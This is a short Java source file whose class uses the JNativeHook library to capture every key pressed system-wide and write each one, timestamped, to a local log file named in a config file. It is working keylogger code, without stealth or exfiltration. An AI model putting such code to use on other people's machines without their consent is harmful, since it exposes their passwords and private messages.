package random;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.Date;
import java.util.Properties;
import java.util.logging.FileHandler;
import java.util.logging.LogRecord;
import java.util.logging.SimpleFormatter;

public class Logger implements NativeKeyListener {

    private java.util.logging.Logger logger;

    Logger(String filePath) throws IOException {
        logger = java.util.logging.Logger.getLogger("Key Log");

        String configFilePath;
        if (!filePath.isEmpty()) {
            configFilePath = filePath;
        } else {
            InputStream inputStream = new FileInputStream("config.properties");
            Properties properties = new Properties();
            properties.load(inputStream);
            configFilePath = properties.getProperty("FilePath");
        }

        FileHandler fileHandler = new FileHandler(configFilePath);
        logger.addHandler(fileHandler);
        SimpleFormatter simpleFormatter = new SimpleFormatter() {
            private static final String format = "[%1$tF %1$tT] %3$s %n";

            @Override
            public synchronized String format(LogRecord lr) {
                return String.format(format,
                        new Date(lr.getMillis()),
                        lr.getLevel().getLocalizedName(),
                        lr.getMessage()
                );
            }
        };
        fileHandler.setFormatter(simpleFormatter);
    }

    /**
     * Overridden method to capture the pressed keys.
     */
    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        logger.info(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
    }

    /**
     * Overridden method to capture released keys.
     */
    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
    }

    /**
     * Overridden method to capture the typed keys.
     */
    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
    }

}
